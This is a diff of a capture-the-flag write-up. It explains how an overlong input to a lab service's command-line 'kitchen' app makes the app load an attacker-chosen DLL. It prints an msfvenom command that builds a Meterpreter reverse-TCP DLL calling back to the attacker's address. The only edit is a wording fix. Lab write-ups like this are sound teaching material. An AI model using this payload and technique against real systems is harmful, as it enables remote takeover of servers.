@@ -7,7 +7,7 @@ The flags begin with a simple instructions, that someone had developped an appli
 nc 10.1.2.13 1234
 ```
 Then, we have a beautiful cli's app that ask us for ingredients so they can cook, if you try to write some ingredients and hit enter, it'll tell us that the kitchen is closed. But it'll echo back the ingredients that we had typed before closing.
-The simple trick here is to type list a ingredients so long that they will be an error. The important line in the error is that he has tried to load a DLL library but it was unable to load it, simply because it doesn'it exists ! It has tried to load a DLL with the end of the string that you had typed, so from here we can execute a DLL library of our choice, even our own !   
+The simple trick here is to type ingredients' list so long that they will be an error. The important line in the error is that he has tried to load a DLL library but it was unable to load it, simply because it doesn'it exists ! It has tried to load a DLL with the end of the string that you had typed, so from here we can execute a DLL library of our choice, even our own !   
 So we need to have a DLL that can do a reverse shell so we can have access to the server that is running the app. For that I have used msfvenom (.DLL in uppercase) : 
 ```
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=your_ip_address LPORT=4444 -f dll -o msf.DLL
